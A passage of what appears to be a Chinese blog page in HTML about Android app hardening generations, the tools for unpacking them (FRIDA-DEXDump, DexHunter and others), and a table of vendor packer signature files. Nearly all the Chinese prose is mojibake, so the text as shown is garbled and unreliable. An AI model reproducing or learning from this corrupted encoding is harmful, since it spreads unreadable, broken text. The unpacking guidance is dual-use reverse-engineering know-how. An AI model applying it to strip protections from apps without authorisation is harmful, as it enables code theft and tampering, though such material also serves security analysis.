å¯†</strong></p><p>é‡‡ç”¨åŠ å¯†ç®—æ³•å¯¹ dex çš„å­—ç¬¦ä¸²è¿›è¡ŒåŠ å¯†å¤„ç†ï¼Œåç¼–è¯‘åæ— æ³•ç›´æ¥æŸ¥çœ‹å…¶ä»£ç ã€‚ä¾‹ï¼šåŠ å¯†å‰ä»£ç ä¸ºï¼šString a &#x3D; â€œThis is a string!â€; åŠ å¯†åä»£ç ï¼šString a &#x3D; StringFog.decrypt(â€œABCDEFGHIJKLMNâ€); è¿è¡Œæ—¶ä»£ç ï¼šï¼šdecrypt: â€œABCDEFGHIJKLMNâ€ &#x3D;&gt; â€œThis is a string!â€ã€‚</p></li><li><p><strong>é™æ€ DEX æ–‡ä»¶æ•´ä½“åŠ è§£å¯†</strong></p><p>dex æ–‡ä»¶æ•´ä½“åŠ å£³çš„åŸºæœ¬åŸç†æ˜¯å¯¹ classes.dex è¿™ä¸ªæ–‡ä»¶è¿›è¡Œæ•´ä½“åŠ å¯†ï¼Œå°†åŠ å¯†åå¾—åˆ°çš„æ–‡ä»¶ å­˜æ”¾åœ¨ apk æ–‡ä»¶çš„èµ„æºæ–‡ä»¶ä¸­ï¼Œå¹¶åœ¨App è¿è¡Œæ—¶å°†åŠ å¯†åçš„ classes.dex æ–‡ä»¶åœ¨å†…å­˜ä¸­è¿›è¡Œè§£å¯†ï¼Œå†è®© Dalvik è™šæ‹ŸæœºåŠ¨æ€åŠ è½½è§£å¯†åçš„åŸå§‹ clases.dex æ–‡ä»¶å¹¶æ‰§è¡Œã€‚</p></li><li><p><strong>èµ„æºåŠ å¯†</strong></p><p>å¯¹ apk è§£å‹åçš„èµ„æºæ–‡ä»¶è¿›è¡ŒåŠ å¯†å¤„ç†ï¼Œå®‰å“èµ„æºæ–‡ä»¶ä¸€èˆ¬æŒ‡ res å’Œ assets ç›®å½•ä¸‹çš„æ–‡ä»¶ã€‚ä¾‹ï¼šèµ„æºåŠ å¯†åç¨‹åºåœ¨è¯»æ–‡ä»¶æˆ–è€…è§£å‹ä¸¤ä¸ªè¿‡ç¨‹è¿›è¡Œ hookï¼Œå¹¶å¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œè§£å¯†ï¼Œå°±èƒ½è¾¾åˆ°èµ„æºä¿æŠ¤çš„æ•ˆæœã€‚ä¾‹ï¼šå°†åŸèµ„æºæ–‡ä»¶ res&#x2F;layout&#x2F;activity_main.xml å‘½åä¸ºres&#x2F;a&#x2F;a.xmlã€‚</p></li><li><p><strong>ååç¼–è¯‘</strong></p><p>é€šè¿‡æ·»åŠ åè°ƒè¯•ã€åè™šæ‹Ÿæœºç­‰åŠŸèƒ½æ¥å¯¹æŠ—åç¼–è¯‘å·¥å…·ã€‚ä¾‹å¦‚ï¼šPtrace åè°ƒè¯•ï¼Œä½¿ç”¨ Ptrace ç³»ç»Ÿè°ƒç”¨æ¥ç›‘æ§è°ƒè¯•å™¨çš„è¡Œä¸ºï¼Œå¦‚æœæ£€æµ‹åˆ°è°ƒè¯•å™¨å­˜åœ¨ï¼Œåˆ™ä¼šç»ˆæ­¢åº”ç”¨çš„è¿è¡Œã€TracePid å€¼æ ¡éªŒåè°ƒè¯•ï¼Œé€šè¿‡æ ¡éªŒ TracePid å€¼æ¥åˆ¤æ–­æ˜¯å¦è¢«è°ƒè¯•ï¼Œå¦‚æœä¸åŒ¹é…åˆ™è®¤ä¸ºè¢«è°ƒè¯•ã€‚</p></li><li><p><strong>è‡ªå®šä¹‰ DexClassLoader</strong></p><p>ä½¿ç”¨è‡ªå®šä¹‰ DexClassLoader å¯¹åŠ å¯†çš„ DEX æ–‡ä»¶è¿›è¡ŒåŠ è½½ã€‚è¿™æ ·å¯ä»¥åœ¨åº”ç”¨è¿è¡Œæ—¶åŠ¨æ€åŠ è½½å’Œè§£å¯†åŠ å¯†åçš„ DEX æ–‡ä»¶ã€‚</p></li><li><p><strong>è½åœ°åŠ è½½</strong></p></li></ul><p>â€‹å°†åº”ç”¨çš„ä»£ç å’Œèµ„æºæ‰“åŒ…æˆä¸€ä¸ªå•ç‹¬çš„æ–‡ä»¶ï¼Œå¯¹ apk è§£å‹åï¼Œæ–‡ä»¶å¤¹å†…å¯çœ‹è§ç›¸å…³ dex æ–‡ä»¶ã€‚</p><h4 id="è„±å£³å·¥å…·"><a href="#è„±å£³å·¥å…·" class="headerlink" title="è„±å£³å·¥å…·"></a>è„±å£³å·¥å…·</h4><ul><li><p>å†…å­˜ Dump æ³•</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç”±äºæ˜¯dexæ•´ä½“ä¿æŠ¤ï¼Œåœ¨å†…å­˜ä¸­æ˜ å°„æ˜¯æ•´ä½“è¿ç»­çš„ï¼Œé€šè¿‡å®šä½èµ·å§‹åœ°å€å°† app å®Œæ•´è„±ä¸‹æ¥ã€‚å¯¹äºå®Œæ•´çš„ dexï¼Œé‡‡ç”¨æš´åŠ›æœç´¢ dex035 é‡‡ç”¨å·¥å…·ï¼šFRIDA-DEXdump  é¡¹ç›®åœ°å€ï¼šhttps://github.com/hluwa/FRIDA-DEXDump</span><br></pre></td></tr></table></figure></div></li></ul><h3 id="ç¬¬äºŒä»£åŠ å›ºå£³"><a href="#ç¬¬äºŒä»£åŠ å›ºå£³" class="headerlink" title="ç¬¬äºŒä»£åŠ å›ºå£³"></a>ç¬¬äºŒä»£åŠ å›ºå£³</h3><h4 id="dexæŠ½å–ä¸åŠ å›º"><a href="#dexæŠ½å–ä¸åŠ å›º" class="headerlink" title="dexæŠ½å–ä¸åŠ å›º"></a>dexæŠ½å–ä¸åŠ å›º</h4><p>ç¬¬äºŒä»£åŠ å£³æŠ€æœ¯ å¯¹ DEX æ–‡ä»¶æ•´ä½“è¿›è¡Œäº†ä¿æŠ¤ , å°†å…¶ä¸­çš„ å…³é”®ä»£ç æŠ½å–åˆ°å¤–éƒ¨ , DEX åŠ è½½åˆ°å†…å­˜ä¸­å , ä¸æ˜¯å®Œæ•´çš„ DEX æ–‡ä»¶ , å³ä½¿å°†æ•´ä¸ª DEX æ–‡ä»¶ DUMP ä¸‹æ¥ä¹‹å , å…¶ä¸­çš„ä¸€äº›è¢«æŠ½å–å‡ºæ¥çš„å…³é”®ä»£ç æ— æ³•çœ‹åˆ° , ä¹Ÿå°±æ˜¯ DEX æ–‡ä»¶ä¸­çš„å…³é”®ç±»æˆ–æ–¹æ³•æ˜¯ç©ºçš„ã€‚ç¬¬ä¸€ä»£å£³ä¸»è¦é’ˆå¯¹æ•´ä¸ª APK æ–‡ä»¶è¿›è¡ŒåŠ å¯†ï¼Œç¬¬äºŒä»£å£³åˆ™å¯¹ Dex æ–‡ä»¶è¿›è¡Œæ•´ä½“åŠ å›ºã€‚ç¬¬äºŒä»£å£³é€šè¿‡å°† Dex ä»£ç åŠ å¯†åˆ° native å±‚å³ so æ–‡ä»¶ï¼ˆso æ–‡ä»¶æ˜¯æŒ‡åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ï¼Œå®ƒåŒ…å«äº†ä¸€äº›å¯æ‰§è¡Œçš„å‡½æ•°å’Œæ•°æ®ï¼Œå¯ä»¥è¢«åŠ è½½åˆ°å†…å­˜ä¸­å¹¶è¢«åº”ç”¨è°ƒç”¨ã€‚soçš„è·¯å¾„åœ¨**&#x2F;data&#x2F;data&#x2F;packagename&#x2F;lib**, æˆ–è€…&#x2F;data&#x2F;app&#x2F;packagename&#x2F;lib ç›¸å…³ç›®å½•ä¸‹ã€‚ï¼‰ï¼Œå¸¸è§åŠ å›ºæ‰‹æ®µå¦‚ä¸‹ï¼š</p><ul><li><p><strong>DexåŠ¨æ€åŠ è½½</strong></p><p>DEXæ–‡ä»¶çš„åŠ å¯†å’Œéƒ¨åˆ†å‡½æ•°é€»è¾‘çš„æŠ½å–åˆ°SOæ–‡ä»¶ä¸­ã€‚åŠ è½½å™¨åœ¨è¿è¡Œæ—¶è´Ÿè´£è§£å¯†å’ŒåŠ è½½DEXæ–‡ä»¶ï¼Œå¹¶ä½¿åº”ç”¨ç¨‹åºèƒ½å¤ŸåŠ¨æ€æ‰§è¡Œå…¶ä¸­çš„ä»£ç é€»è¾‘ã€‚</p></li><li><p><strong>SoåŠ å¯†</strong></p><p>é’ˆå¯¹ so æ–‡ä»¶è¿›è¡ŒåŠ å¯†ï¼Œso æ–‡ä»¶é€šå¸¸åŒ…å«äº†æ•æ„Ÿçš„æœ¬åœ°ä»£ç æˆ–å‡½æ•°å®ç°ï¼ŒåŠ å¯†åç¨‹åºå°†åœ¨è¿è¡Œæ—¶å¯¹ so è¿›è¡Œè§£å¯†è·å–è§£å¯†æ•°æ®ã€‚</p></li><li><p><strong>Dex methodä»£ç æŠ½å–åˆ°å¤–éƒ¨(é€šå¸¸ä¼ä¸šç‰ˆ)</strong></p><p>å°†æ•æ„Ÿçš„ Dex Method ä»£ç ä» DEX æ–‡ä»¶ä¸­æå–å‡ºæ¥ï¼Œå¹¶è¿›è¡ŒåŠ å¯†å’Œæ··æ·†ã€‚</p></li><li><p><strong>ä¸è½åœ°åŠ è½½</strong> </p><p>apk ç›®å½•ä¸‹ä¸èƒ½çœ‹åˆ°åŸå§‹ dexï¼ŒæŠŠåŠ å¯†çš„ dex æ–‡ä»¶åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œç„¶åè§£å¯†ï¼Œä»å§‹è‡³ç»ˆä¸ä¼šä»¥æ–‡ä»¶å½¢å¼å­˜åœ¨ã€‚</p></li><li><p><strong>åè°ƒè¯•ï¼Œé˜² HOOK</strong></p></li><li><p>æ£€æµ‹è°ƒè¯•å™¨ã€åè°ƒè¯•æŠ€æœ¯ã€å†…å­˜å®Œæ•´æ€§æ£€æµ‹ã€ä»£ç æ··æ·†å’ŒåŠ å¯†ã€é˜²HOOKæŠ€æœ¯ã€ç­¾åæ ¡éªŒã€‚</p></li></ul><h4 id="è„±å£³å·¥å…·-1"><a href="#è„±å£³å·¥å…·-1" class="headerlink" title="è„±å£³å·¥å…·"></a>è„±å£³å·¥å…·</h4><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Dexhunterï¼š https://github.com/zyq8709/DexHunter</span><br><span class="line">elf-dump-fixï¼šhttps://github.com/maiyao1988/elf-dump-fix</span><br></pre></td></tr></table></figure></div><h3 id="ç¬¬ä¸‰ä»£åŠ å›ºå£³"><a href="#ç¬¬ä¸‰ä»£åŠ å›ºå£³" class="headerlink" title="ç¬¬ä¸‰ä»£åŠ å›ºå£³"></a>ç¬¬ä¸‰ä»£åŠ å›ºå£³</h3><h4 id="Dex-åŠ¨æ€è§£å¯†ä¸-so-æ··æ·†"><a href="#Dex-åŠ¨æ€è§£å¯†ä¸-so-æ··æ·†" class="headerlink" title="Dex åŠ¨æ€è§£å¯†ä¸ so æ··æ·†"></a>Dex åŠ¨æ€è§£å¯†ä¸ so æ··æ·†</h4><p>ç¬¬ä¸‰ä»£å£³åœ¨ç¬¬äºŒä»£å£³çš„åŸºç¡€ä¸Šç»§ç»­æ”¹è¿›ï¼Œå¯¹æŠ— dump å†…å­˜è„±å£³ã€‚åŠ æ·±å¯¹ Dex çš„åŠ å¯†ã€‚ä½¿ç”¨DEXåŠ¨æ€åŠ è§£å¯†çš„åº”ç”¨ç¨‹åºæ¥è¯´ï¼Œè§£å¯†çš„è¿‡ç¨‹æ˜¯åœ¨è¿è¡Œæ—¶è¿›è¡Œçš„ï¼Œè¿™æ„å‘³ç€åªæœ‰åœ¨éœ€è¦æ‰§è¡Œç‰¹å®šçš„ä»£ç æˆ–æ–¹æ³•æ—¶ï¼Œç›¸åº”çš„DEXéƒ¨åˆ†æ‰ä¼šè¢«è§£å¯†å¹¶åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œæ‰€ä»¥å¯¼è‡´å†…å­˜æ˜¯ä¸è¿ç»­çš„æ— æ³•ç›´æ¥ dump å®Œæ•´çš„å†…å­˜ã€‚å¸¸è§åŠ å›ºæ‰‹æ®µå¦‚ä¸‹ï¼š</p><ul><li><p><strong>Dex methodä»£ç åŠ¨æ€è§£å¯†</strong></p><p>å°†æ•æ„Ÿçš„ Dex Method ä»£ç åœ¨è¿è¡Œæ—¶è¿›è¡Œè§£å¯†åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œè‹¥æ²¡æœ‰æ‰§è¡Œåˆ°çš„  Method ä»£ç åˆ™ä¸è¿›è¡Œè§£å¯†å¹¶ä¸é‡Šæ”¾åˆ°å†…å­˜ä¸­å»ã€‚</p></li><li><p><strong>So ä»£ç è†¨èƒ€æ··æ·†</strong></p><p>é€šè¿‡å¢åŠ æ— æ•ˆçš„ã€å†—ä½™çš„ä»£ç å’Œæ•°æ®ï¼Œä½¿å¾—åº”ç”¨ç¨‹åºçš„ä»£ç é‡å˜å¾—åºå¤§å’Œå¤æ‚ï¼Œä»è€Œå¢åŠ äº†åˆ†æè€…é˜…è¯»å’Œç†è§£ä»£ç çš„éš¾åº¦ã€‚</p></li></ul><h4 id="è„±å£³å·¥å…·-2"><a href="#è„±å£³å·¥å…·-2" class="headerlink" title="è„±å£³å·¥å…·"></a>è„±å£³å·¥å…·</h4><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dex2oatï¼šhttps://github.com/spriteviki/Dex2oatHunter</span><br></pre></td></tr></table></figure></div><h3 id="ç¬¬å››ä»£åŠ å›ºå£³"><a href="#ç¬¬å››ä»£åŠ å›ºå£³" class="headerlink" title="ç¬¬å››ä»£åŠ å›ºå£³"></a>ç¬¬å››ä»£åŠ å›ºå£³</h3><h4 id="VMP-è™šæ‹Ÿæœºä¿æŠ¤"><a href="#VMP-è™šæ‹Ÿæœºä¿æŠ¤" class="headerlink" title="VMP(è™šæ‹Ÿæœºä¿æŠ¤)"></a>VMP(è™šæ‹Ÿæœºä¿æŠ¤)</h4><p>è™šæ‹Ÿæœºä¿æŠ¤æŠ€æœ¯ã€‚å®ƒé€šè¿‡åœ¨åº”ç”¨ç¨‹åºä¸­å¼•å…¥è‡ªå®šä¹‰çš„è™šæ‹Ÿæœºï¼Œå°†åŸå§‹ä»£ç è½¬æ¢ä¸ºè™šæ‹ŸæŒ‡ä»¤ï¼Œä»è€Œéšè—å’Œä¿æŠ¤åº”ç”¨ç¨‹åºçš„é€»è¾‘å’Œç®—æ³•ã€‚</p><h4 id="è„±å£³æ–¹æ³•"><a href="#è„±å£³æ–¹æ³•" class="headerlink" title="è„±å£³æ–¹æ³•"></a>è„±å£³æ–¹æ³•</h4><p>æš‚æœªæ¢ç´¢åˆ°è‡ªåŠ¨åŒ–å·¥å…·è¿›è¡Œè‡ªåŠ¨åŒ–è„±å£³ã€‚</p><h3 id="ç¬¬äº”ä»£åŠ å›ºå£³"><a href="#ç¬¬äº”ä»£åŠ å›ºå£³" class="headerlink" title="ç¬¬äº”ä»£åŠ å›ºå£³"></a>ç¬¬äº”ä»£åŠ å›ºå£³</h3><h4 id="è™šæ‹Ÿæœºæºç ä¿æŠ¤ï¼ˆLLVMï¼‰"><a href="#è™šæ‹Ÿæœºæºç ä¿æŠ¤ï¼ˆLLVMï¼‰" class="headerlink" title="è™šæ‹Ÿæœºæºç ä¿æŠ¤ï¼ˆLLVMï¼‰"></a>è™šæ‹Ÿæœºæºç ä¿æŠ¤ï¼ˆLLVMï¼‰</h4><p>åŸºäºç¬¬å››ä»£æ–¹æ¡ˆçš„ç¬¬ä¸€ç§æ–¹æ¡ˆï¼ˆJava&#x2F;Kotlin â†’ C&#x2F;C++ï¼‰ï¼Œé‡‡ç”¨LLVMç¼–è¯‘å·¥å…·é“¾ï¼ˆåŒæ—¶æ”¯æŒC&#x2F;C++, Swift, Object-Cï¼‰ï¼Œé€šè¿‡å¯¹IRè¿›è¡ŒæŒ‡ä»¤è½¬æ¢ï¼Œç”Ÿæˆ<strong>è‡ªå®šä¹‰æŒ‡ä»¤é›†ï¼ˆIR â†’ VMï¼‰</strong>ï¼ŒAPPå†…éƒ¨éš”ç¦»å‡ºç‹¬ç«‹çš„æ‰§è¡Œç¯å¢ƒï¼Œå°†è¯¥æ ¸å¿ƒä»£ç æ”¾ç½®åœ¨æ­¤ç‹¬ç«‹çš„æ‰§è¡Œç¯å¢ƒä¸­è¿è¡Œ</p><h4 id="è„±å£³æ–¹æ³•-1"><a href="#è„±å£³æ–¹æ³•-1" class="headerlink" title="è„±å£³æ–¹æ³•"></a>è„±å£³æ–¹æ³•</h4><p>æš‚æœªæ¢ç´¢åˆ°è‡ªåŠ¨åŒ–å·¥å…·è¿›è¡Œè‡ªåŠ¨åŒ–è„±å£³ã€‚</p><hr><h2 id="ä¸‰ã€å£³è¯†åˆ«"><a href="#ä¸‰ã€å£³è¯†åˆ«" class="headerlink" title="ä¸‰ã€å£³è¯†åˆ«"></a>ä¸‰ã€å£³è¯†åˆ«</h2><h4 id="æ‰‹æœºåº”ç”¨ä¸€é”®è¯†åˆ«"><a href="#æ‰‹æœºåº”ç”¨ä¸€é”®è¯†åˆ«" class="headerlink" title="æ‰‹æœºåº”ç”¨ä¸€é”®è¯†åˆ«"></a>æ‰‹æœºåº”ç”¨ä¸€é”®è¯†åˆ«</h4><p>MTç®¡ç†å™¨ï¼š<a href="https://mt2.cn/">https://mt2.cn/</a></p><p><a data-fancybox="gallery" data-src="/../images/mobile/reinforce/image-20231207152604122.png" data-caption="image-20231207152604122"><img src="/../images/mobile/reinforce/image-20231207152604122.png" alt="image-20231207152604122"></a></p><h4 id="Windows-å®¢æˆ·ç«¯"><a href="#Windows-å®¢æˆ·ç«¯" class="headerlink" title="Windows å®¢æˆ·ç«¯"></a>Windows å®¢æˆ·ç«¯</h4><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">appmsg4.6.3ï¼ˆå·¦ï¼‰ï¼šhttps://github.com/sulab999/AppMessenger</span><br><span class="line">ApkScan-PKIDï¼ˆå³ï¼‰ï¼šhttps://pan.baidu.com/s/1rDfsEvqQwhUmep1UBLUwSQï¼ˆæ³¨æ„ï¼šè¯¥å·¥å…·ä¸º2018å¹´ç‰ˆæœ¬ï¼‰</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/reinforce/image-20231207153148309.png" data-caption="image-20231207153148309"><img src="/../images/mobile/reinforce/image-20231207153148309.png" alt="image-20231207153148309"></a></p><h4 id="åŠ å›ºå£³ç‰¹å¾"><a href="#åŠ å›ºå£³ç‰¹å¾" class="headerlink" title="åŠ å›ºå£³ç‰¹å¾"></a>åŠ å›ºå£³ç‰¹å¾</h4><table><thead><tr><th>å‚å•†</th><th>ç‰¹å¾</th><th>Javaä»£ç ç‰¹å¾</th></tr></thead><tbody><tr><td>360åŠ å›º</td><td>assets&#x2F;.appkey<br/>assets&#x2F;libjiagu.so<br/>libjiagu_art.so<br/>libjiagu_x86.so<br/>libprotectClass.so<br/>libjgdtc.so<br/>libjgdtc_a64.so<br/>libjgdtc_art.so<br/>libjgdtc_x64.so<br/>libjgdtc_x86.so<br/>libjiagu_a64.so<br/>libjiagu_ls.so<br/>libjiagu_x64.so<br/>libSafeManageService.so<br/>libjiagu_vip_x64.so<br/>libjiagu_vip.so<br/>libX86Bridge.so</td><td>com.stub.StubApp</td></tr><tr><td>å‡360åŠ å›º</td><td></td><td>com.qihoo.util.stub2678363137</td></tr><tr><td>APKProtect</td><td>libAPKProtect.so</td><td></td></tr><tr><td>UUå®‰å…¨åŠ å›º</td><td>assets&#x2F;libuusafe.jar.so<br/>assets&#x2F;libuusafe.so<br/>lib&#x2F;armeabi&#x2F;libuusafeempty.so</td><td></td></tr><tr><td>apktoolplusåŠ å›º</td><td>assets&#x2F;jiagu_data.bin<br/>assets&#x2F;sign.bin<br/>lib&#x2F;armeabi&#x2F;libapktoolplus_jiagu.so</td><td>com.linchaolong.apktoolplus.jiagu.ProxyApplication</td></tr><tr><td>ä¸­å›½ç§»åŠ¨åŠ å›º</td><td>assets&#x2F;mogosec_classes<br/>assets&#x2F;mogosec_data<br/>assets&#x2F;mogosec_dexinfo<br/>assets&#x2F;mogosec_march<br/>ibmogosecurity.so<br/>lib&#x2F;armeabi&#x2F;libcmvmp.so<br/>lib&#x2F;armeabi&#x2F;libmogosec_dex.so<br/>lib&#x2F;armeabi&#x2F;libmogosec_sodecrypt.so<br/>lib&#x2F;armeabi&#x2F;libmogosecurity.so</td><td>com.mogosec.AppMgr</td></tr><tr><td>å‡ ç»´å®‰å…¨</td><td>assets&#x2F;dex.dat<br/>lib&#x2F;armeabi&#x2F;kdpdata.so<br/>lib&#x2F;armeabi&#x2F;libkdp.so<br/>lib&#x2F;armeabi&#x2F;libkwscmm.so<br/>libkwscr.so<br/>libkwslinker.so</td><td>com.Kiwisec.KiwiSecApplicationã€com.Kiwisec.ProxyApplication</td></tr><tr><td>å¯æ˜æ˜Ÿè¾°</td><td>libvenSec.so<br/>libvenustech.so</td><td></td></tr><tr><td>ç½‘ç§¦åŠ å›º</td><td>libnqshield.so</td><td></td></tr><tr><td>å¨œè¿¦åŠ å›º</td><td>libchaosvmp.so<br/>libddog.so<br/>libfdog.so<br/>libhdog.so</td><td></td></tr><tr><td>å¨œè¿¦åŠ å›ºï¼ˆæ–°ç‰ˆ2022ï¼‰</td><td>assets&#x2F;maindata&#x2F;fake_classes.dex<br/>lib&#x2F;armeabi&#x2F;libxloader.so<br/>lib&#x2F;armeabi-v7a&#x2F;libxloader.so<br/>lib&#x2F;arm64-v8a&#x2F;libxloader.so<br/>libxloader.so</td><td></td></tr><tr><td>å¨œè¿¦åŠ å›ºï¼ˆå¼€å‘è€…è¯•ç”¨ç‰ˆ-VMPï¼‰</td><td>libvdog-x86.so<br/>libvdog.so</td><td></td></tr><tr><td>å¨œè¿¦åŠ å›ºï¼ˆä¼ä¸šç‰ˆï¼‰</td><td>libedog.so</td><td></td></tr><tr><td>æ¢†æ¢†å®‰å…¨ï¼ˆä¼ä¸šç‰ˆï¼‰</td><td>libDexHelper-x86.so<br/>libDexHelper.so<br/>libDexHelper-x86_64.so</td><td></td></tr><tr><td>æ¢†æ¢†å®‰å…¨ï¼ˆå®šåˆ¶ç‰ˆï¼‰</td><td>assets&#x2F;classes.jar<br/> lib&#x2F;armeabi&#x2F;DexHelper.so</td><td></td></tr><tr><td>æ¢†æ¢†å®‰å…¨ï¼ˆå…è´¹ç‰ˆï¼‰</td><td>assets&#x2F;secData0.jar<br/>lib&#x2F;armeabi&#x2F;libSecShell-x86.so<br/>lib&#x2F;armeabi&#x2F;libSecShell.so<br/>libSecShell_art.so<br/>libSecShel1.so<br/>libsecexe.so<br/>libsecmain.so<br/>libbangcle_crypto_tool.so<br/>libpnc-crypto.so</td><td>com.secneo.apkwrapper.ApplicationWrapperã€com.SecShell.SecShell.ApplicationWrapperã€com.secneo.apkwrapper.AW</td></tr><tr><td>å‡æ¢†æ¢†åŠ å›º</td><td></td><td>com.secoen.apkwrapper.ApplicationWrapper</td></tr><tr><td>æµ·äº‘å®‰åŠ å›º</td><td>assets&#x2F;itse<br/>lib&#x2F;armeabi&#x2F;libitsec.so<br/>libitsec.so</td><td>c.b.c.b</td></tr><tr><td>çˆ±åŠ å¯†</td><td>assets&#x2F;af.bin<br/>assets&#x2F;ijm_lib&#x2F;X86&#x2F;libexec.so<br/>assets&#x2F;ijm_lib&#x2F;armeabi&#x2F;libexec.so<br/>assets&#x2F;signed.bin<br/>ijiami.dat<br/>lib&#x2F;armeabi&#x2F;libexecmain.so<br/>libexecmain.so<br/>libexecmain_x86.so<br/>libexecoat.so<br/>libexecoat_x86.so<br/>libijm-emulator.so</td><td>s.h.e.l.l.S</td></tr><tr><td>çˆ±åŠ å¯†ä¼ä¸šç‰ˆ</td><td>assets&#x2F;ijiami.ajm</td><td></td></tr><tr><td>çˆ±åŠ å¯†3ä»£å£³</td><td>assets&#x2F;ijiami3.ajm<br/>libexecv3.so</td><td></td></tr><tr><td>çˆ±åŠ å¯†5ä»£å£³</td><td>assets&#x2F;IJMDal.Data<br/>assets&#x2F;libijmDataEncryption.so<br/>libijmDataEncryption_arm64.so<br/>libijmDataEncryption_x86.so<br/>libijmDataEncryption_x86_64.so</td><td></td></tr><tr><td>çŠç‘šçµå¾¡</td><td>assets&#x2F;libreincp.so<br/>assets&#x2F;libreincp_x86.so</td><td>com.coral.util.StubApplication</td></tr><tr><td>ç‘æ˜ŸåŠ å›º</td><td>librsprotect.so</td><td></td></tr><tr><td>ç™¾åº¦åŠ å›º</td><td>libbaiduprotect.so<br/>assets&#x2F;baiduprotect.jar<br/>assets&#x2F;baiduprotect1.jar<br/>lib&#x2F;armeabi&#x2F;libbaiduprotect.so<br/>libbaiduprotect_art.so<br/>libbaiduprotect_x86.so</td><td>com.baidu.protect.StubApplication</td></tr><tr><td>ç››å¤§åŠ å›º</td><td>libapssec.so</td><td></td></tr><tr><td>ç½‘æ˜“æ˜“ç›¾</td><td>libnesec.so</td><td></td></tr><tr><td>è…¾è®¯åŠ å›º</td><td>libexec.so<br/>libshell.so</td><td>com.tencent.StubShell.TxAppEntry</td></tr><tr><td>è…¾è®¯ä¹å›ºï¼ˆæ—§ç‰ˆï¼‰</td><td>libtup.so<br/>lib&#x2F;armeabi&#x2F;mix.dex<br/>liblegudb.so<br/>libshella<br/>lib&#x2F;armeabi&#x2F;mixz.dex<br/>libshel1x<br/>lib&#x2F;armeabi&#x2F;libshella-xxxx.so<br/>lib&#x2F;armeabi&#x2F;libshellx-xxxx.so<br/>tencent_stub<br/>libshella-2.10.2.3.so<br/>libshell.so<br/>libshella-2.9.0.2<br/>libshella-4.1.0.15.so<br/>libshella-4.1.0.19.so<br/>libshellx.so</td><td>com.tencent.StubShell.TxAppEntry</td></tr><tr><td>è…¾è®¯ä¹å›ºï¼ˆVMPï¼‰</td><td>lib&#x2F;arm64-v8a&#x2F;libxgVipSecurity.so<br/>lib&#x2F;armeabi-v7a&#x2F;libxgVipSecurity.so<br/>libxgVipSecurity.so</td><td></td></tr><tr><td>è…¾è®¯äº‘åŠ å›º</td><td>assets&#x2F;libshellx-super.2021.so<br/>lib&#x2F;armeabi&#x2F;libshell-super.2019.so<br/>lib&#x2F;armeabi&#x2F;libshell-super.2020.so<br/>lib&#x2F;armeabi&#x2F;libshell-super.2021.so<br/>lib&#x2F;armeabi&#x2F;libshell-super.2022.so<br/>lib&#x2F;armeabi&#x2F;libshell-super.2023.so<br/>tencent_sub</td><td></td></tr><tr><td>è…¾è®¯äº‘ç§»åŠ¨åº”ç”¨å®‰å…¨</td><td>0000000lllll.dex<br/>00000olllll.dex<br/>000O00ll111l.dex<br/>00O000ll111l.dex<br/>0OO00l111l1l<br/>o0oooOO0ooOo.dat</td><td></td></tr><tr><td>è…¾è®¯äº‘ç§»åŠ¨åº”ç”¨å®‰å…¨ï¼ˆè…¾è®¯å¾¡å®‰å…¨ï¼‰</td><td>libBugly-yaq.so<br/>libshell-super.2019.so<br/>libshellx-super.2019.so<br/>libzBugly-yaq.so<br/>t86<br/>tosprotection<br/>tosversion<br/>000000011111.dex<br/>000000111111.dex<br/>000001111111<br/>00000o11111.dex<br/>o0ooo000oo0o.dat</td><td></td></tr><tr><td>è…¾è®¯å¾¡å®‰å…¨</td><td>libtosprotection.armeabi-v7a.so<br/>libtosprotection.armeabi.so<br/>libtosprotection.x86.so<br/>assets&#x2F;libtosprotection.armeabi-v7a.so<br/>assets&#x2F;libtosprotection.armeabi.so<br/>assets&#x2F;libtosprotection.x86.so<br/>assets&#x2F;tosversion<br/>lib&#x2F;armeabi&#x2F;libTmsdk-xxx-mfr.so<br/>lib&#x2F;armeabi&#x2F;libtest.so</td><td>MyWrapperProxyApplication</td></tr><tr><td>è…¾è®¯Bugly</td><td>lib&#x2F;arm64-v8a&#x2F;libBugly.so<br/>libBugly.so</td><td></td></tr><tr><td>è›®çŠ€åŠ å›º</td><td>assets&#x2F;mxsafe.config<br/>assets&#x2F;mxsafe.data<br/>assets&#x2F;mxsafe.jar<br/>assets&#x2F;mxsafe&#x2F;arm64-v8a&#x2F;libdSafeShell.so<br/>assets&#x2F;mxsafe&#x2F;x86_64&#x2F;libdSafeShell.so<br/>libdSafeShell.so</td><td></td></tr><tr><td>é€šä»˜ç›¾</td><td>libNSaferOnly.so<br/>libegis.so<br/>libgeiri.so<br/>libgeiri-x86.so</td><td></td></tr><tr><td>é˜¿é‡ŒåŠ å›º</td><td>assets&#x2F;armeabi&#x2F;libzuma.so<br/>aliprotect.dat<br/>assets&#x2F;armeabi&#x2F;libfakejni.so<br/>assets&#x2F;libzuma.so<br/>assets&#x2F;libzumadata.so<br/>assets&#x2F;libpreverify1.so<br/>libsgmain.so<br/>libsgsecuritybody.so<br/>libmobisec.so</td><td></td></tr><tr><td>é˜¿é‡Œäº‘åŠ 